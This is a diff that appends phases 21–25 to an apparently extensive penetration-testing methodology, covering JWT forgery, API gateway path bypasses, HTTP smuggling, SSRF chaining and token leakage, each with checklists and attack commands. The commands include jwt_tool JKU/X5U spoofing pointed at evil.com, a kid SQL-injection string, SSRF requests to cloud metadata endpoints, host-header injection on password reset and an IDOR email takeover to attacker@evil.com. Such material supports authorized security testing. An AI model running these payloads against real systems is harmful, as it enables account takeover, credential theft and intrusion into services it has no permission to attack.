@@ -2310,3 +2310,262 @@ curl https://registry.target.com/v2/app/tags/list
 - grpcurl - gRPC reflection and testing
 - Impacket - NTLM/Kerberos attack suite
 - kubectl - Kubernetes permission testing
+
+---
+
+# v4.0 Extension — Deep Research Methodology Phases (2026-10)
+# Original content above is UNCHANGED.
+
+## Phase 21: JWT Advanced & Token Forgery Testing
+
+### Objective
+Test for JKU/X5U header injection, algorithm confusion, issuer array injection, kid parameter injection, and nested JSON DoS.
+
+### Checklist
+- [ ] Inspect JWT headers for jku/x5u fields
+- [ ] Test JKU injection with attacker-controlled JWKS URL
+- [ ] Test X5U injection with attacker certificate
+- [ ] Test algorithm confusion (RS256→HS256) with server's public key
+- [ ] Test issuer claim as JSON array (CVE-2025-30144)
+- [ ] Test kid parameter for SQL injection and path traversal
+- [ ] Test embedded JWK injection (CVE-2018-0114 style)
+- [ ] Test nested JSON DoS (CVE-2025-53864)
+- [ ] Test URL filter bypass for jku/x5u (open redirect, parser confusion, DNS rebinding)
+
+### Commands
+```bash
+# JKU spoof
+python3 jwt_tool.py <token> -X s -ju https://evil.com/jwks.json
+# X5U injection
+python3 jwt_tool.py <token> -I -hc x5u -hv https://evil.com/cert.pem
+# Embedded JWK (CVE-2018-0114)
+python3 jwt_tool.py <token> -X i
+# Algorithm confusion (CVE-2024-54150)
+python3 jwt_tool.py <token> -X k -pk public.pem
+# Issuer array test
+# Modify JWT payload: {"iss":["https://evil.com","https://legit.com"],"sub":"admin"}
+# kid SQL injection
+# Modify kid: "key1' UNION SELECT 'known_secret' --"
+# kid path traversal
+# Modify kid: "../../dev/null"
+```
+
+### Reference Files
+- `knowledge-base/47-jwt-oauth-advanced-2025.md`
+- `payloads/advanced-chaining-payloads.txt`
+
+---
+
+## Phase 22: API Gateway Path Normalization Testing
+
+### Objective
+Test for path normalization discrepancies between gateway and backend, including trailing slash, double encoding, double slash, dot segment traversal, version downgrade, mass assignment, and GraphQL APQ bypass.
+
+### Checklist
+- [ ] Test trailing slash bypass (/path vs /path/)
+- [ ] Test double encoding (%2561dmin → /admin)
+- [ ] Test double slash (//path bypass)
+- [ ] Test dot segment traversal (/allowed/../restricted/)
+- [ ] Test encoded dot segments (/%2e%2e/)
+- [ ] Test API version downgrade (v0/v1/v2/beta/internal/legacy)
+- [ ] Test semicolon path parameters (/admin;jsessionid=fake)
+- [ ] Test case manipulation (/Admin vs /admin)
+- [ ] Test mass assignment on PUT/PATCH/POST endpoints
+- [ ] Test GraphQL APQ registration bypass
+- [ ] Test GraphQL alias batching for rate limit bypass
+
+### Commands
+```bash
+# Trailing slash bypass
+curl -v https://target/api/admin && curl -v https://target/api/admin/
+
+# Double encoding bypass
+curl -v https://target/%2561dmin
+
+# Double slash bypass
+curl -v https://target//admin
+
+# Dot segment traversal
+curl -v https://target/api/../admin/
+curl -v https://target/api/%2e%2e/admin/
+
+# Version downgrade enumeration
+for v in v0 v1 v2 beta internal legacy; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/api/$v/users")
+  echo "$v: $code"
+done
+
+# Mass assignment test
+curl -X PUT https://target/api/users/me \
+  -H 'Authorization: Bearer <token>' \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"test","role":"admin","is_admin":true}'
+
+# GraphQL APQ bypass
+curl -X POST https://target/graphql -H 'Content-Type: application/json' \
+  -d '{"query":"{__schema{types{name fields{name}}}}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"attacker_hash"}}}'
+```
+
+### Reference Files
+- `knowledge-base/48-api-gateway-path-normalization.md`
+- `payloads/path-normalization-payloads.txt`
+
+---
+
+## Phase 23: HTTP Smuggling & WebSocket Auth Bypass Testing
+
+### Objective
+Test for HTTP request smuggling (CL.TE/TE.CL/TE.TE), header normalization smuggling, WebSocket authentication bypass, CSWSH, and local WebSocket hijacking.
+
+### Checklist
+- [ ] Identify proxy/backend technology (Nginx, HAProxy, Kestrel, Kong, etc.)
+- [ ] Test CL.TE basic probe
+- [ ] Test TE.CL basic probe
+- [ ] Test TE.TE with obfuscation variants
+- [ ] Test chunk extension smuggling (CVE-2025-55315)
+- [ ] Test header normalization underscore/hyphen confusion (CVE-2025-64484)
+- [ ] Test WebSocket Origin validation
+- [ ] Test Cross-Site WebSocket Hijacking (CSWSH)
+- [ ] Test post-handshake re-authentication
+- [ ] Test local WebSocket server enumeration (IDE extensions)
+- [ ] Test FortiOS jsconsole WebSocket bypass (CVE-2024-55591)
+
+### Commands
+```bash
+# Use smuggler.py for automated smuggling detection
+python3 smuggler.py -u https://target.com
+
+# Use Burp HTTP Request Smuggler extension
+
+# WebSocket Origin test
+wscat -c wss://target.com/ws -H 'Origin: https://evil.com'
+
+# Local WebSocket port scan (from browser)
+# for (let port = 3000; port < 4000; port++) { new WebSocket('ws://localhost:'+port); }
+
+# HTTP smuggling probes - see payloads file for full details
+```
+
+### Reference Files
+- `knowledge-base/49-http-smuggling-websocket-advanced.md`
+- `payloads/advanced-chaining-payloads.txt`
+
+---
+
+## Phase 24: SSRF Chaining & Multi-Vector ATO Testing
+
+### Objective
+Test SSRF to cloud metadata chains, XSS→OAuth token theft, IDOR→ATO chains, host header injection, CSRF SameSite bypass.
+
+### Checklist
+- [ ] Test SSRF to AWS/Azure/GCP metadata endpoints
+- [ ] Test IP encoding bypasses (decimal, octal, hex, IPv6)
+- [ ] Test DNS rebinding for SSRF bypass
+- [ ] Test redirect chain SSRF bypass
+- [ ] Test XSS for localStorage/sessionStorage token theft
+- [ ] Test XSS-initiated OAuth popup token capture
+- [ ] Test IDOR on user management endpoints (sequential IDs)
+- [ ] Test IDOR email change → password reset chain
+- [ ] Test host header injection on password reset
+- [ ] Test X-Forwarded-Host and alternative headers
+- [ ] Test CSRF with SameSite Lax bypass via _method=POST
+- [ ] Test CSRF token removal (omit token entirely)
+- [ ] Test OAuth redirect URI chaining via open redirects
+
+### Commands
+```bash
+# SSRF cloud metadata tests
+curl 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/'
+curl 'https://target/api/fetch?url=http://2852039166/latest/meta-data/'
+curl 'https://target/api/fetch?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/'
+
+# IDOR email change
+curl -X PUT https://target/api/users/1002 \
+  -H 'Authorization: Bearer <attacker_token>' \
+  -d '{"email":"attacker@evil.com"}'
+
+# Host header injection
+curl -X POST https://target/forgot-password \
+  -H 'Host: evil.com' -d 'email=victim@example.com'
+curl -X POST https://target/forgot-password \
+  -H 'X-Forwarded-Host: evil.com' -d 'email=victim@example.com'
+
+# XFF bypass
+curl https://target/admin -H 'X-Forwarded-For: 127.0.0.1'
+```
+
+### Reference Files
+- `knowledge-base/50-ssrf-cloud-metadata-chains.md`
+- `payloads/advanced-chaining-payloads.txt`
+
+---
+
+## Phase 25: Emerging Threats & Token Leakage Testing
+
+### Objective
+Assess AitM phishing resilience, supply chain OAuth risk, bearer token leakage, CORS misconfiguration, and XFF trust bypass.
+
+### Checklist
+- [ ] Assess MFA type (TOTP/SMS/push vs FIDO2/WebAuthn)
+- [ ] Check OAuth device code flow availability
+- [ ] Audit third-party OAuth application consents
+- [ ] Check for bearer tokens in URL parameters
+- [ ] Test token behavior across cross-origin redirects (Axios CVE-2025-27152)
+- [ ] Test CORS reflected origin with credentials
+- [ ] Test null origin acceptance
+- [ ] Test X-Forwarded-For trust bypass
+- [ ] Test alternative IP headers (X-Real-IP, True-Client-IP, CF-Connecting-IP)
+- [ ] Review detection/prevention controls against CVE matrix
+
+### Commands
+```bash
+# CORS misconfiguration test
+curl -H "Origin: https://evil.com" https://target.com/api/user -v 2>&1 | grep -i 'access-control'
+
+# XFF bypass test
+curl https://target/admin -H 'X-Forwarded-For: 127.0.0.1'
+curl https://target/admin -H 'X-Real-IP: 127.0.0.1'
+curl https://target/admin -H 'True-Client-IP: 127.0.0.1'
+
+# Token in URL test
+# Check if any endpoint accepts ?token= or ?access_token= parameter
+curl 'https://target/api/data?token=<jwt>'
+
+# Token redirect leakage
+curl -L -H "Authorization: Bearer <token>" https://target/redirect-test -v
+
+# Referer leakage test
+# Set Referrer-Policy and check if tokens leak via Referer header
+```
+
+### Reference Files
+- `knowledge-base/51-emerging-auth-threats-2025.md`
+- `knowledge-base/52-detection-prevention-matrix.md`
+- `payloads/advanced-chaining-payloads.txt`
+
+---
+
+## v4.0 Extended Phase Summary
+
+| Phase | Focus | KB Files | Payloads | Tools |
+|-------|-------|----------|----------|-------|
+| 21 | JWT Advanced & Token Forgery | 47 | advanced-chaining-payloads.txt | jwt_tool |
+| 22 | API Gateway Path Normalization | 48 | path-normalization-payloads.txt | proxyaudit |
+| 23 | HTTP Smuggling & WebSocket | 49 | advanced-chaining-payloads.txt | smuggler.py |
+| 24 | SSRF Chaining & Multi-Vector ATO | 50 | advanced-chaining-payloads.txt | - |
+| 25 | Emerging Threats & Token Leakage | 51, 52 | advanced-chaining-payloads.txt | CORStest |
+
+## v4.0 Tools Reference (External)
+
+| Tool | Purpose | Source |
+|------|---------|--------|
+| jwt_tool | JWT attack automation | github.com/ticarpi/jwt_tool |
+| smuggler.py | HTTP request smuggling | github.com/defparam/smuggler |
+| BatchQL | GraphQL batching attacks | github.com/assetnote/batchql |
+| InQL | GraphQL introspection/attack | github.com/doyensec/inql |
+| graphql-cop | GraphQL security audit | github.com/dolevf/graphql-cop |
+| CORStest | CORS misconfiguration scanner | github.com/RUB-NDS/CORStest |
+| proxyaudit | API gateway path normalization | github.com/cerberauth/proxyaudit |
+| BOLABuster | LLM-assisted BOLA detection | github.com/paloaltonetworks/BOLABuster |
+| Burp HTTP Request Smuggler | Request smuggling extension | BApp Store |
+| Burp Autorize | BOLA/IDOR testing | BApp Store |
